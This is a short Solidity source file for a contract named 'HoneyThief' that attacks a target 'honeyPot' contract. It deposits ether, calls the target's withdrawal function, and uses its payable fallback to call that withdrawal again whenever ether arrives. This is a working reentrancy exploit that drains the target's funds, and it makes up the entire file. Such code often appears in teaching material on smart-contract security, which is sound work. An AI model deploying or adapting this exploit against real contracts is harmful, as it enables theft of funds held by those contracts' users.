pragma solidity 0.4.24;

contract HoneyThief {
    
    address public honeyPot;

    event LogFallback(address indexed sender, uint indexed value, uint newBalance);

    constructor(address honeyPotAddress) public {
        honeyPot = honeyPotAddress;
    }

    function() external payable {
        emit LogFallback(msg.sender, msg.value, address(this).balance);
        honeyPot.call(abi.encodeWithSignature("get()", ""));
    }

    function put() public payable {
       bool success = honeyPot.call.value(msg.value)(abi.encodeWithSignature("put()", ""));
       require(success, "Call failed.");
    }

    function get() public {
        bool success = honeyPot.call(abi.encodeWithSignature("get()", ""));
        require(success, "Call failed.");
    }
}